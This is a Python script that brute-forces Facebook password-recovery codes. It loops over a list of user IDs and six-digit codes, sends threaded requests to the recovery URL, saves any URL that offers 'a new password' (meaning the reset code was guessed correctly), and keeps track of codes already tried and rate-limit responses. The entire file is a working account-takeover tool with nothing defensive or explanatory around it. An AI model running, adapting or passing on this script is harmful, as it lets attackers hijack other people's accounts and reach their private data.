import requests
from time import time
from os import listdir, mkdir
from random import shuffle
from threading import Thread
start = time()
#url = "https://www.facebook.com/recover/password/?u=100043722211323&n=754161&fl=default_recover&sih=0

try: listdir('log')
except: mkdir('log')

try:
    fl = [i for i in listdir('log') if 'log' in i][-1]
    log = 'log/log%i.txt'%(int(fl[3:-4])+1)
    with open(log, 'w') as fob:
        fob.close()
except:
    log = 'log/log0.txt'
    with open(log, 'w') as fob:
        fob.close()

def pf(s):
    print(s)
    with open(log, 'a+') as fob:
        fob.write(s+"\n")
        fob.close()

pf("Loading...")
with open("uid.txt", 'r') as fob:
    uids = fob.readlines()
    uids = [i[:15] for i in uids]
    pf("Number of ID's found: %i."%len(uids))
    fob.close()

with open("c.txt", 'r') as fob:
    cs = fob.readlines()
    cs = [i[:6] for i in cs]
    fob.close()

with open("d.txt", 'r') as fob:
    ds = fob.readlines()
    ds = [i[:6] for i in ds]
    fob.close()

def passChecker(uid, c):
    global uids
    url = "https://www.facebook.com/recover/password/?u={0}&n={1}&fl=default_recover&sih=0".format(uid,c)
    page = requests.get(url)
    if b"a new password" in page.content:
        pf(url)
        with open ("urls.txt", 'a+') as fob:
            fob.write(url+"\n")
            fob.close()
    elif b"use this feature at the moment" in page.content:
        pf("Limit Exided(%s)!: %s"%(c,uids.pop(uids.index(uid))))

shuffle(cs)
end = time()
pf("Loading Completed! Time took: %.5fs.\nBuilding Threads..."%(end-start))
ts = []
start = end
for c in cs:
    if c in ds: pass
    else:
        with open('d.txt', 'a+') as fob: fob.write('%s:%i\n'%(c,len(uids))); fob.close()
        ds.append(c)
        ts = [Thread(target=passChecker, args=(uid, c)) for uid in uids]
        print("Threading Started... (%s:%i)"%(c,len(uids)))
        [t.start() for t in ts]
        [t.join() for t in ts]
        end = time()
        print("Threading Completed. Time took: %.5fs."%(end-start))
        start = end

